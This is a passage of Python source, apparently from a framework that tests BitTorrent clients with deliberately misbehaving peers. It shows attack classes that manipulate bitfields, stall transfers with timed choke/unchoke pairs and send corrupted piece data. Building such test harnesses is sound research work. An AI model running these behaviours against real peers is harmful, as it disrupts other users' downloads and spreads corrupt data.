        # Making sure we stay interested.
        pass

    def send_piece(self, index, begin, piece):
        # Wait a few -requests before sending our request.
        # We only want to send a single request.
        if self._requestcount > 3 and not self._requested:
            self.send_request(1, 0, 16384)
            self._requested = True

        self._requestcount += 1

        AtkChoke.send_piece(self, index, begin, piece)

    def send_bitfield(self, bitfield):
        #Assuming that we are using the rand1_big_piece torrent
        # that only has two pieces. We want the bitfield to be
        # zero
        bitfield.set0(0)
        bitfield.set0(1)

        AtkChoke.send_bitfield(self, bitfield)

        # We have to set the piece back to 1 or the tester
        # will never respond to any requests for that piece.
        bitfield.set1(0)


class AtkChokeSleep(ExperimentBase):
    '''
    Sends a choke/unchoke pair for any message request that isnt the
    start of piece. The choke pair is separated by a 10 second sleep
    time. If the request is the start of a piece (begin == 0), then we
    send a bad_piece composed of all 'a's

    '''

    def __init__(self):
        ExperimentBase.__init__(self)

    def send_piece(self, index, begin, piece):
        if begin > 0:
            log.msg('{0}, event:ignore_piece'.format(self.peer_id_str))
            self.send_choke()
            sleep(10)
            self.send_unchoke()
            return

        log.msg('{0}, -bad_piece'.format(self.peer_id_str))

        #Always send bad data for a piece
        #pieces are of type string.
        bad_piece = 'a' * len(piece)

        data = struct.pack('!II', index, begin) + bad_piece
        self.send_message(self.msg_piece, data)
